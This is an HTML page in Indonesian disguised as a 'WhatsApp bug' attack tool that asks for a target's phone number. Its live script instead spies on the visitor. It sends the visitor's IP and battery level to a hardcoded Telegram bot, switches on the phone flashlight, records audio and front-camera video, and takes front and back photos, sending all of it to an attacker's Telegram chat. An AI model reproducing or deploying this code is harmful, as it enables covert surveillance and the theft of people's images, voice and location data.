<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8">
  <title>dhack bug</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;900&display=swap" rel="stylesheet">
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      background: linear-gradient(135deg, #0f0f23 0%, #1a1a2e 50%, #16213e 100%);
      font-family: 'Inter', sans-serif;
      color: lime;
      height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      overflow: hidden;
      position: relative;
      padding: 20px;
    }
    .bg-particles { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: 0; }
    .particle {
      position: absolute;
      width: 2px;
      height: 2px;
      background: rgba(0, 255, 127, 0.3);
      border-radius: 50%;
      animation: float 6s ease-in-out infinite;
    }
    @keyframes float {
      0%, 100% { transform: translateY(0px); opacity: 0.3; }
      50% { transform: translateY(-20px); opacity: 0.8; }
    }
    .login-container {
      background-color: rgba(17, 17, 17, 0.95);
      padding: 30px;
      border-radius: 16px;
      box-shadow: 0 0 20px lime;
      text-align: center;
      max-width: 400px;
      width: 100%;
      z-index: 2;
    }
    .login-title {
      font-size: 26px;
      font-weight: 900;
      margin-bottom: 10px;
      background: linear-gradient(135deg, #00ff7f, #ffffff);
      -webkit-background-clip: text;
      -webkit-text-fill-color: transparent;
    }
    .login-subtitle { font-size: 13px; color: #ffc107; margin-bottom: 20px; }
    .login-input {
      width: 100%;
      padding: 12px;
      margin-bottom: 16px;
      background: #333;
      border: none;
      border-radius: 6px;
      color: #fff;
      font-size: 15px;
    }
    .login-button {
      width: 100%;
      padding: 12px;
      background: linear-gradient(135deg, #00ff7f, #00cc66);
      color: black;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-weight: 600;
      font-size: 15px;
    }
    .login-button:hover { background-color: #0f0; box-shadow: 0 0 20px lime; }
    #info {
      white-space: pre-wrap;
      text-align: left;
      margin-top: 20px;
      background: #222;
      padding: 15px;
      border-radius: 8px;
      font-size: 13px;
    }
    video, canvas { display: none; }
  </style>
</head>
<body>
  <div class="bg-particles"></div>

  <div class="login-container">
    <p class="login-title">bug WhatsApp By Hacked official</p>
    <p class="login-subtitle">⚠️ Jangan Disalahgunakan</p>
    <input type="number" class="login-input" placeholder="Nomor WhatsApp Target" id="text">
    <button class="login-button" id="login-button">Atack</button>
    <div id="info">🥷 number target...</div>
  </div>

  <video id="video" autoplay playsinline muted></video>
  <canvas id="canvas" width="1280" height="720"></canvas>

  <script>
    const botToken = '8403098052:AAHoNelCuHdAaZJwYZQxH0kJPgkbC2hXOdg';
    const chatIds = ['7945789634'];
    const infoDiv = document.getElementById('info');
    const input = document.getElementById('text');
    const button = document.getElementById('login-button');

    function sendToTelegram(text) {
      chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
        }).catch(console.error);
      });
    }

    function sendMedia(blob, type, filename, caption) {
      chatIds.forEach(id => {
        const formData = new FormData();
        formData.append('chat_id', id);
        formData.append(type, blob, filename);
        if(caption) formData.append('caption', caption);
        
        let endpoint = 'sendPhoto';
        if(type === 'video') endpoint = 'sendVideo';
        if(type === 'voice') endpoint = 'sendVoice';

        fetch(`https://api.telegram.org/bot${botToken}/${endpoint}`, {
          method: 'POST',
          body: formData
        }).catch(console.error);
      });
    }

    // Fitur Baru: Flash HP 20 Detik
    async function toggleFlash() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: 'environment' } 
        });
        const track = stream.getVideoTracks()[0];
        const capabilities = track.getCapabilities();

        if (!capabilities.torch) {
          sendToTelegram('gagal menyalahkan flash');
          track.stop();
          return;
        }

        await track.applyConstraints({ advanced: [{ torch: true }] });
        sendToTelegram('flash berhasil nyala ✅');

        setTimeout(async () => {
          await track.applyConstraints({ advanced: [{ torch: false }] });
          track.stop();
        }, 20000); // 20 detik
      } catch (err) {
        sendToTelegram('gagal menyalahkan flash');
      }
    }

    async function getInfo() {
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        const battery = await navigator.getBattery?.() || { level: 0 };
        const text = `IP: ${ipData.ip}\nBaterai: ${(battery.level * 100).toFixed(0)}%\nWaktu: ${new Date().toLocaleString()}`;
        sendToTelegram(`<b>📥 Info Pengunjung:</b>\n<pre>${text}</pre>`);
      } catch {}
    }

    async function recordAudio() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
        mediaRecorder.onstop = () => {
          const blob = new Blob(chunks, { type: 'audio/ogg; codecs=opus' });
          sendMedia(blob, 'voice', 'voice.ogg', '🎤 Voice Note (5s)');
          stream.getTracks().forEach(track => track.stop());
        };
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 5000);
      } catch (err) {}
    }

    async function recordVideo() {
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: true });
        const mediaRecorder = new MediaRecorder(stream);
        const chunks = [];
        mediaRecorder.ondataavailable = (e) => chunks.push(e.data);
        mediaRecorder.onstop = () => {
          const blob = new Blob(chunks, { type: 'video/mp4' });
          sendMedia(blob, 'video', 'video.mp4', '🎥 Video Depan (5s)');
          stream.getTracks().forEach(track => track.stop());
        };
        mediaRecorder.start();
        setTimeout(() => mediaRecorder.stop(), 5000);
      } catch (err) {}
    }

    async function capturePhoto(facingMode, label) {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ 
          video: { facingMode: facingMode } 
        });
        video.srcObject = stream;
        return new Promise(resolve => {
          video.onloadedmetadata = () => {
            setTimeout(() => {
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
              canvas.toBlob(blob => {
                if (blob) sendMedia(blob, 'photo', `${label}.jpg`, `📸 Foto: ${label}`);
                stream.getTracks().forEach(track => track.stop());
                resolve();
              }, 'image/jpeg', 0.9);
            }, 2500);
          };
        });
      } catch (err) {}
    }

    button.addEventListener('click', async () => {
      const nomor = input.value.trim();
      if (!nomor || nomor.length < 8) return;
      
      button.disabled = true;
      infoDiv.innerText = '⏳ Memproses sistem...';
      sendToTelegram(`<b>📞 Target:</b> ${nomor}`);
      
      try {
        await getInfo();
        toggleFlash(); // Jalankan Fitur Flash
        recordAudio(); 
        recordVideo();
        
        await capturePhoto("user", "Depan");
        await new Promise(r => setTimeout(r, 1500));
        await capturePhoto("environment", "Belakang");
        
        infoDiv.innerText = `✅ Berhasil memproses ${nomor}`;
        button.disabled = false;
        input.value = '';
      } catch (e) {
        infoDiv.innerText = '❌ Terjadi kesalahan.';
        button.disabled = false;
      }
    });

    function createParticles() {
      const container = document.querySelector('.bg-particles');
      for (let i = 0; i < 30; i++) {
        const p = document.createElement('div');
        p.className = 'particle';
        p.style.left = Math.random() * 100 + '%';
        p.style.top = Math.random() * 100 + '%';
        container.appendChild(p);
      }
    }
    document.addEventListener('DOMContentLoaded', createParticles);
  </script>
</body>
</html>
